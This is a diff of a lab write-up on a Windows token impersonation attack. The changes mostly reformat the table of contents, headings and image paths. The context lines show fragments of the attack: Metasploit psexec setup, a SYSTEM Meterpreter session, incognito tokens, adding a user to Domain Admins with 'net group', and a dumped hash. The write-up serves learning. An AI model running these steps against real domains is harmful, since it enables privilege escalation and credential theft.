@@ -8,46 +8,30 @@
 
 ## Table of Contents
 
-<!-- - [Introduction](#introduction)
+- [Introduction](#introduction)
 - [Lab Setup](#lab-setup)
 - [Attack Flow](#attack-flow)
+
 - [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
-  - [1.1 Start Metasploit](#step-11-starting-metasploit)
-  - [1.2 Search for psexec](#step-12-now-search-for-psexec)
-  - [1.3 Use exploit/windows/smb/psexec](#step-13-use-exploitwindowssmbpsexec)
-  - [1.4 View module options](#step-14-display-all-available-settings-for-a-metasploit-module)
-  - [1.5 Set required options](#step-15-setting-required-options)
-  - [1.6 Get Meterpreter session](#step-16-get-meterpreter-session)
-- [Step 2 - Check UID](#step-2-check-uid)
+  - [1.1 Start Metasploit](#11-start-metasploit)
+  - [1.2 Search for PsExec](#12-search-for-psexec)
+  - [1.3 Use PsExec Module](#13-use-psexec-module)
+  - [1.4 View Module Options](#14-view-module-options)
+  - [1.5 Setting Required Options](#15-setting-required-options)
+  - [1.6 Get Meterpreter Session](#16-get-meterpreter-session)
+
+- [Step 2 - Check UID](#step-2---check-uid)
 - [Step 3 - Load Incognito](#step-3---load-incognito)
 - [Step 4 - List Available Tokens](#step-4---list-available-tokens)
 - [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
 - [Step 6 - Verify Access](#step-6---verify-access)
-  - [6.1 Create Domain User](#step-61---create-a-domain-user)
-  - [6.2 Add User to Domain Admins Group](#step-62---add-a-user-to-the-domain-admins-group)
-- [Step 7 - Dump All Hashes](#step-7---dump-all-hashes)
-- [Key Takeaways](#key-takeaways)
-- [Mitigation](#mitigation) -->
 
-- [Introduction](#introduction)
-- [Lab Setup](#lab-setup)
-- [Attack Flow](#attack-flow)
-- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
-  - [1.1 Start Metasploit](#step-11-start-metasploit)
-  - [1.2 Search for PsExec](#step-12-search-for-the-psexec-module)
-  - [1.3 Use exploit/windows/smb/psexec](#step-13-use-the-psexec-module)
-  - [1.4 View Module Options](#step-14-view-module-options)
-  - [1.5 Set Required Options](#step-15-setting-required-options)
-  - [1.6 Get Meterpreter Session](#step-16-get-meterpreter-session)
-- [Step 2 - Check UID](#step-2-check-uid)
-- [Step 3 - Load Incognito](#step-3-load-incognito)
-- [Step 4 - List Available Tokens](#step-4-list-available-tokens)
-- [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
-- [Step 6 - Verify Access](#step-6-verify-access)
-- [Step 7 - Add New User](#step-7-add-new-user)
-  - [Step 7.1 - Create a Domain User](#step-71-create-a-domain-user)
-  - [Step 7.2 - Add a User to the Domain Admins Group](#step-72-add-a-user-to-the-domain-admins-group)
-- [Step 8 - Dump All Hashes](#step-8-dump-all-hashes)
+- [Step 7 - Add New User](#step-7---add-new-user)
+  - [Step 7.1 - Create a Domain User](#step-71---create-a-domain-user)
+  - [Step 7.2 - Add a User to the Domain Admins Group](#step-72---add-a-user-to-the-domain-admins-group)
+
+- [Step 8 - Dump All Hashes](#step-8---dump-all-hashes)
+
 - [Key Takeaways](#key-takeaways)
 - [Mitigation](#mitigation)
 - [References](#references)
@@ -118,12 +102,12 @@ msfconsole -q
 msf6 >
 ```
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step1 1.1.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step1 1.1.png" width="600">
 </p>
 
 The quiet mode does not change how Metasploit works. It only reduces the amount of information displayed when the console starts.
 
-### Step 1.2: Search for the `PsExec` Module
+### 1.2 Search for PsExec
 
 Next, I searched for the available PsExec modules.
 
@@ -182,7 +166,7 @@ Matching Modules
    ```
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step1 1.2.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step1 1.2.png" width="600">
 </p>
 
 ### Step 1.3: Use the PsExec Module
@@ -203,7 +187,7 @@ msf exploit(windows/smb/psexec) >
 ```
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step1 1.3.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step1 1.3.png" width="600">
 </p>
 
 This module uses valid Windows credentials to execute a payload over SMB and open a Meterpreter session on the target.
@@ -259,7 +243,7 @@ Exploit target:
 View the full module info with the info, or info -d command.
 ```
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step1 1.4.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step1 1.4.png" width="600">
 </p>
 
 ### Step 1.5: Setting Required Options
@@ -297,7 +281,7 @@ SMBDomain => readteambd.local
 msf exploit(windows/smb/psexec) >
 ```
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step1 1.5.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step1 1.5.png" width="600">
 </p>
 
 ### Step 1.6: Get Meterpreter Session
@@ -326,7 +310,7 @@ meterpreter >
 After this, I successfully got a Meterpreter session on the target system.
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step1 1.6.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step1 1.6.png" width="600">
 </p>
 
 
@@ -347,7 +331,7 @@ Server username: NT AUTHORITY\SYSTEM
 This shows that I already had SYSTEM-level access on the target machine.
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step2-1.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step2-1.png" width="600">
 </p>
 
 ## Step 3 - Load Incognito
@@ -397,7 +381,7 @@ No tokens available
 From the list, I could see multiple delegation tokens, including the Administrator account in the domain.
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step3.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step3.png" width="600">
 </p>
 
 ## Step 5 - Impersonate the Administrator Token
@@ -482,7 +466,7 @@ The command completed successfully.
 This confirms that a new domain user was created successfully in my lab environment.
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step6.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step6.png" width="600">
 </p>
 
 ## Step 7.2 - Add a User to the Domain Admins Group
@@ -500,7 +484,6 @@ net group "Domain Admins" test /ADD /DOMAIN
 - `Domain Admins` – The target group name (quotes needed because of the space).
 - `test` – The username being added to the group.
 - `/ADD` – The action — adds the user to the group.
-
 
 **Output:**
 
@@ -606,7 +589,7 @@ VICTIM-2$:des-cbc-md5:7ac1431fd0f20298
 Finally, I was able to dump all hashes successfully.
 
 <p align="center">
-  <img src="/writeups/token impersonation attack/images/step7.png" width="600">
+  <img src="/writeups/05-token impersonation attack/images/step7.png" width="600">
 </p>
 
 
